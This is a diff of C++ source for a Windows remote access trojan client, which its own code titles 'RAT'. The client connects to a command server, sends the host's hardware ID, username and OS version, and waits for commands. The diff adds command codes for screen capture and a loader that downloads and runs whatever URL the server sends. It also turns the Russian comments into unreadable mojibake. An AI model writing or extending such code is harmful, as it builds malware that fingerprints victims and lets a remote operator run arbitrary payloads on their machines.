@@ -1,4 +1,4 @@
-#include "winsock2.h"
+п»ї#include "winsock2.h"
 #include "intrin.h"
 #include "ntdll.h"
 #include "iphlpapi.h"
@@ -9,13 +9,19 @@
 
 SOCKET Socket;
 
-//полностью копируем структуры из сервера
+#define CMD_HADSHAKE	0x00
+#define CMD_ONLINE		0x01
+#define CMD_OTVET_OK	0x02
+#define CMD_OTVET_ER	0x03
+#define CMD_SCREEN		0x04
+#define CMD_LOADER		0x05
+
 struct CLIENTS
 {
-	SOCKET NUMBER; //это поле мы заполнять не будем, так как оно не важно
-	char USERNAME[100]; //поле в которое мы скопируем имя юзера
-	char OSVER[100]; //поле в которое мы скопируем версию ос
-	char HWID[100]; //уникальное поле для этого юзера
+	SOCKET SOCKET;
+	char USERNAME[100];
+	char OSVER[100];
+	char HWID[100];
 };
 
 struct DLE
@@ -23,11 +29,10 @@ struct DLE
 	char URL[1000];
 };
 
-//полностью копируем структуры из сервера
 struct CMDiDATA
 {
-	DWORD CMD; //тут у нас будут номера комманд
-	char DATA[1000]; //а тут данные которые мы хотим принять или отправить серверу
+	DWORD CMD;
+	char DATA[4000];
 };
 
 void GetHwid(char** hwid)
@@ -83,19 +88,19 @@ DWORD WINAPI RecvThread(LPVOID param)
 {
 	while (TRUE)
 	{
-		CMDiDATA indata; //создаем структуру отвечающую за протокол
-		memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
-		if (sizeof(CMDiDATA) == recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0)); //прием сообщения от клиента
+		CMDiDATA indata; //СЃРѕР·РґР°РµРј СЃС‚СЂСѓРєС‚СѓСЂСѓ РѕС‚РІРµС‡Р°СЋС‰СѓСЋ Р·Р° РїСЂРѕС‚РѕРєРѕР»
+		memset(&indata, 0, sizeof(CMDiDATA)); //РїРѕС‡РёСЃС‚РёРј 
+		if (sizeof(CMDiDATA) == recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0)); //РїСЂРёРµРј СЃРѕРѕР±С‰РµРЅРёСЏ РѕС‚ РєР»РёРµРЅС‚Р°
 		{
 			printf("cmd recv cmd: %d\n", indata.CMD);
 			switch (indata.CMD)
 			{
-				case 1://если indata.cmd == 1
+				case CMD_LOADER://РµСЃР»Рё indata.cmd == CMD_LOADER
 				{
-					DLE dle; //инициализируем структуру DLE
-					memset(&dle, 0, sizeof(dle)); //очищаем ее
-					memcpy(&dle, indata.DATA, sizeof(indata.DATA)); //и копируем в нее indata.DATA
-					printf("url: %s\n", dle.URL); //напечатаем пришедший урл
+					DLE dle; //РёРЅРёС†РёР°Р»РёР·РёСЂСѓРµРј СЃС‚СЂСѓРєС‚СѓСЂСѓ DLE
+					memset(&dle, 0, sizeof(dle)); //РѕС‡РёС‰Р°РµРј РµРµ
+					memcpy(&dle, indata.DATA, sizeof(indata.DATA)); //Рё РєРѕРїРёСЂСѓРµРј РІ РЅРµРµ indata.DATA
+					printf("url: %s\n", dle.URL); //РЅР°РїРµС‡Р°С‚Р°РµРј РїСЂРёС€РµРґС€РёР№ СѓСЂР»
 					CreateThread(NULL, 0, DLEFUNC, (LPVOID)dle.URL, 0, 0);
 					break;
 				}
@@ -106,7 +111,7 @@ DWORD WINAPI RecvThread(LPVOID param)
 	}
 }
 
-//будущая точка входа нашего ратника
+//Р±СѓРґСѓС‰Р°СЏ С‚РѕС‡РєР° РІС…РѕРґР° РЅР°С€РµРіРѕ СЂР°С‚РЅРёРєР°
 int CALLBACK WinMain(HINSTANCE hInstance,
 	HINSTANCE hPrevInstance,
 	LPSTR lpCmdLine,
@@ -120,24 +125,24 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 
 	SetConsoleTitleA("RAT");
 
-	//инициализируем структуры винсока
+	//РёРЅРёС†РёР°Р»РёР·РёСЂСѓРµРј СЃС‚СЂСѓРєС‚СѓСЂС‹ РІРёРЅСЃРѕРєР°
 	struct WSAData wsaData;
 	WORD DLLVersion = MAKEWORD(2, 1);
 	WSAStartup(DLLVersion, &wsaData);
 	SOCKADDR_IN ServerAddr;
 	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	ServerAddr.sin_family = AF_INET;
-	//задаем конект на локалхост к восьмидесятому порту
+	//Р·Р°РґР°РµРј РєРѕРЅРµРєС‚ РЅР° Р»РѕРєР°Р»С…РѕСЃС‚ Рє РІРѕСЃСЊРјРёРґРµСЃСЏС‚РѕРјСѓ РїРѕСЂС‚Сѓ
 	ServerAddr.sin_port = htons(80);
 	ServerAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
-	//подключаемся к серверу!!!
+	//РїРѕРґРєР»СЋС‡Р°РµРјСЃСЏ Рє СЃРµСЂРІРµСЂСѓ!!!
 	if (connect(Socket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr)) == 0)
 	{
-		//если мы подключились то передаем хендшейк:)
-		CMDiDATA indata; //создаем структуру отвечающую за протокол
-		CLIENTS client; //создаем структуру отвечающую за инфу о клиенте
-		memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
-		memset(&client, 0, sizeof(CLIENTS)); //почистим
+		//РµСЃР»Рё РјС‹ РїРѕРґРєР»СЋС‡РёР»РёСЃСЊ С‚Рѕ РїРµСЂРµРґР°РµРј С…РµРЅРґС€РµР№Рє:)
+		CMDiDATA indata; //СЃРѕР·РґР°РµРј СЃС‚СЂСѓРєС‚СѓСЂСѓ РѕС‚РІРµС‡Р°СЋС‰СѓСЋ Р·Р° РїСЂРѕС‚РѕРєРѕР»
+		CLIENTS client; //СЃРѕР·РґР°РµРј СЃС‚СЂСѓРєС‚СѓСЂСѓ РѕС‚РІРµС‡Р°СЋС‰СѓСЋ Р·Р° РёРЅС„Сѓ Рѕ РєР»РёРµРЅС‚Рµ
+		memset(&indata, 0, sizeof(CMDiDATA)); //РїРѕС‡РёСЃС‚РёРј 
+		memset(&client, 0, sizeof(CLIENTS)); //РїРѕС‡РёСЃС‚РёРј
 		
 		char* hwid = (char*)malloc(0);
 		char* user = (char*)malloc(0);
@@ -150,12 +155,12 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 		memcpy(client.HWID, hwid, sizeof(client.HWID));
 		memcpy(client.USERNAME, user, sizeof(client.USERNAME));
 		memcpy(client.OSVER, os, sizeof(client.OSVER));
-		indata.CMD = 0;
+		indata.CMD = CMD_HADSHAKE;
 		memcpy(indata.DATA, &client, sizeof(CLIENTS));
 		send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
 		printf("sended data :: %s %s %s %s\n", client.HWID, client.OSVER, client.USERNAME);
-		HANDLE RECV = CreateThread(NULL, 0, RecvThread, NULL, 0, 0); //создаем тред который будет бесконечно принимать сообщения от сервера
-		WaitForSingleObject(RECV, INFINITE); //Бесконечно ожидаем пока этот тред работает...
+		HANDLE RECV = CreateThread(NULL, 0, RecvThread, NULL, 0, 0); //СЃРѕР·РґР°РµРј С‚СЂРµРґ РєРѕС‚РѕСЂС‹Р№ Р±СѓРґРµС‚ Р±РµСЃРєРѕРЅРµС‡РЅРѕ РїСЂРёРЅРёРјР°С‚СЊ СЃРѕРѕР±С‰РµРЅРёСЏ РѕС‚ СЃРµСЂРІРµСЂР°
+		WaitForSingleObject(RECV, INFINITE); //Р‘РµСЃРєРѕРЅРµС‡РЅРѕ РѕР¶РёРґР°РµРј РїРѕРєР° СЌС‚РѕС‚ С‚СЂРµРґ СЂР°Р±РѕС‚Р°РµС‚...
 		//closesocket(Socket);
 	}
 }
